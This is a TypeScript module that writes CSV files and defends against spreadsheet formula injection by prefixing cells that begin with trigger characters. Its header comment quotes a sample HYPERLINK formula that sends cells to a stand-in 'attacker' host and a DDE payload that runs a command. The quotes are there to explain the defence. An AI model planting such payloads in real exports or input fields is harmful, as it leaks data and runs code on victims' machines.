/**
 * CSV *writing* — the counterpart to `parse-csv.ts`.
 *
 * ## Why this exists: quote-escaping is not enough
 *
 * Every hand-rolled exporter in this repo did the same correct-looking thing:
 *
 *     `"${(cell || '').replace(/"/g, '""')}"`
 *
 * That is valid RFC-4180 and the file parses perfectly. It is also how a
 * formula gets into an auditor's spreadsheet. Excel, LibreOffice and Google
 * Sheets treat a cell whose value BEGINS with `=`, `+`, `-` or `@` as a
 * formula on open — quoting is a CSV-layer concern and the spreadsheet has
 * already moved past it by the time it decides what the cell means.
 *
 * The cells are user-supplied: control names, task titles, SoA justifications.
 * A control named
 *
 *     =HYPERLINK("http://attacker/"&A1,"click")
 *
 * becomes a live formula in a file this product exports for auditors — one
 * that can exfiltrate neighbouring cells to a remote host on a single click,
 * under the auditor's identity rather than the attacker's. `=cmd|'/c calc'!A1`
 * is the same shape aimed at DDE.
 *
 * The tab and carriage-return prefixes are here because they are *stripped*
 * during paste/import on some spreadsheet versions, revealing a leading `=`
 * that was not visible in the raw cell.
 *
 * ## Why a leading apostrophe
 *
 * `'` is the spreadsheet's own "treat the rest as literal text" marker. It is
 * consumed on display, so the auditor sees the intended value rather than
 * `'=SUM(A1)`. The alternative — wrapping as `="value"` — survives display but
 * turns every neutralised cell into a formula of its own, which is a strange
 * thing to hand someone as evidence.
 *
 * ## Why this is not in `parse-csv.ts`
 *
 * Reading and writing have opposite trust directions. `parseCsv` takes bytes
 * we did not author and produces strings; this takes strings we did not author
 * and produces bytes someone else's software will EXECUTE. Keeping them apart
 * keeps that asymmetry visible.
 *
 * @see tests/unit/csv-formula-injection.test.ts
 */

/**
 * Characters that make a spreadsheet read a cell as a formula rather than
 * text. `\t` and `\r` are included because they can be stripped on paste,
 * promoting the next character to the front.
 */
const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Neutralise a single cell's *meaning* — not its syntax.
 *
 * Returns the value unchanged unless it would be read as a formula, in which
 * case it is prefixed with `'`. Does NOT quote or escape; `csvCell` does that
 * afterwards, and the order matters (see `csvCell`).
 */
export function neutralizeCsvCell(value: string): string {
    if (!value) return '';
    return FORMULA_TRIGGERS.includes(value[0]) ? `'${value}` : value;
}

/**
 * Render one cell: neutralise, then quote-escape.
 *
 * The order is load-bearing and easy to get backwards. Neutralising first
 * means the `'` lands INSIDE the quotes, where the spreadsheet reads it as
 * part of the value. Escaping first would put the apostrophe outside the
 * quoted field, producing `'"=SUM(A1)"` — malformed CSV that some parsers
 * repair by discarding the apostrophe, restoring the formula.
 */
export function csvCell(value: string | null | undefined): string {
    const neutralized = neutralizeCsvCell(value ?? '');
    return `"${neutralized.replace(/"/g, '""')}"`;
}

/**
 * Render a matrix of cells to a CSV document.
 *
 * This is the only function an exporter should need. Reach for `csvCell`
 * directly only when assembling rows of differing widths.
 */
export function toCsv(rows: ReadonlyArray<ReadonlyArray<string | null | undefined>>): string {
    return rows.map((row) => row.map(csvCell).join(',')).join('\n');
}
